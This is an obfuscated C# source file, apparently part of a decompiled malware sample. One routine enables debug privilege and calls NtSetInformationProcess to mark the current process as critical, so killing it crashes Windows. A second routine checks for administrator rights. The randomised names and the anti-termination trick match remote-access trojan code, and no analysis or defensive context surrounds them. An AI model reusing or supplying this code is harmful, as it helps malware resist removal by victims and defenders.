using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace frgoWklvEOSV;

public static class CyVDCXKNZkh
{
	[DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", SetLastError = true)]
	private static extern int YzrzMIICMZbr(IntPtr P_0, int P_1, ref int P_2, int P_3);

	public static void jDuYrMVMSFRfuZ()
	{
		int num = 1;
		int num2 = 29;
		Process.EnterDebugMode();
		YzrzMIICMZbr(Process.GetCurrentProcess().Handle, num2, ref num, 4);
	}

	public static bool fziPGhgQsXRkJJwbm()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
